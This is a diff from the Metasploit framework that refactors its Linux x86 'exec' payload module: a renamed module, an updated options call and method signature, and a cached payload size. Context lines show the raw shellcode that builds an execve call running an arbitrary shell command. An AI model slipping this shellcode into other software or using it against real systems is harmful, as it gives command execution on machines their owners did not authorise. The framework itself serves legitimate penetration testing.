@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 ###
 #
@@ -13,7 +11,9 @@ require 'msf/core'
 # Executes an arbitrary command.
 #
 ###
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = 43
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -31,13 +31,13 @@ module Metasploit3
     register_options(
       [
         OptString.new('CMD',  [ true,  "The command string to execute" ]),
-      ], self.class)
+      ])
   end
 
   #
   # Dynamically builds the exec payload based on the user's options.
   #
-  def generate_stage
+  def generate_stage(opts={})
     cmd     = datastore['CMD'] || ''
     payload =
       "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
@@ -45,5 +45,4 @@ module Metasploit3
       Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00"     +
       "\x57\x53\x89\xe1\xcd\x80"
   end
-
 end
